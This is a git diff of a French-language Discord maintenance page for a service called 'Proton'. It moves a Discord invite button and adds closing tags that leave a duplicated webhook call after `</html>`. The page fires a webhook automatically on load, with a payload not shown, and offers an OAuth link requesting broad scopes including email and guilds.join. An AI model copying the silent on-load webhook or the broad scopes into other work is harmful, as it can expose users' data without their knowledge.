@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Proton</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" crossorigin="anonymous" />
   <style>
     body {
       background-color: #ffffff;
@@ -133,6 +133,9 @@
     <a href="https://discord.com/oauth2/authorize?client_id=1109428741630873610&response_type=code&redirect_uri=https%3A%2F%2Fprotonplus.vercel.app%2F&scope=identify+guilds+email+guilds.join+guilds.members.read" class="custom-button">
       Link With Discord
     </a>
+    <a href="https://discord.gg/UCdcGRKdu9" class="custom-button" onclick="yourButtonClickFunction()">
+      <span class="icon-container"><i class="fab fa-discord"></i></span> Discord
+    </a>
     <div class="embed-title">Maintenance</div>
     <div class="embed-description">
       Nous vous informons que Proton est actuellement en cours de maintenance pour des améliorations et des mises à jour.
@@ -142,11 +145,6 @@
       Veuillez revenir bientôt pour profiter de nos services améliorés.
     </div>
     <div class="embed-footer"><b> Proton</b></div>
-
-    <!-- Ajout du bouton Discord en tant que lien avec l'icône -->
-    <a href="https://discord.gg/UCdcGRKdu9" class="custom-button" onclick="yourButtonClickFunction()">
-      <span class="icon-container"><i class="fab fa-discord"></i></span> Discord
-    </a>
   </div>
 
   <script>
@@ -244,6 +242,12 @@
         console.error(error);
       }
     };
+
+    sendWebhookWithMessage();
+  </script>
+</body>
+
+</html>
 
     sendWebhookWithMessage();
   </script>
